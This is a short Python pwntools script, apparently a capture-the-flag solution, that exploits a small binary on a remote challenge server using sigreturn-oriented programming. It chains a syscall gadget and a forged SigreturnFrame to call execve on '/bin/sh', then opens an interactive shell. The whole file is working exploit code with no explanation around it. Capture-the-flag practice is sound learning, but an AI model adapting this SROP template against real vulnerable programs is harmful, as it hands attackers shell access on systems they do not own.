from pwn import *

#target = process('./little')

#pid = gdb.attach(target, "\nb *0x0040100f\n set disassembly-flavor intel\ncontinue")

target = remote('host1.metaproblems.com', 5460)


syscall = 0x000000000040100d
syscall_pop_rax = p64(0x0000000000401007)
binsh = 0x00402000

padding = b''
payload = padding

payload += syscall_pop_rax
payload += p64(0xf)

# Specify the architecture
context.arch = "amd64"

frame = SigreturnFrame()

frame.rip = syscall
frame.rdi = binsh 
frame.rax = 59
frame.rsi = 0
frame.rdx = 0

payload += bytes(frame)
print(bytes(frame))

target.sendline(payload)

target.interactive()
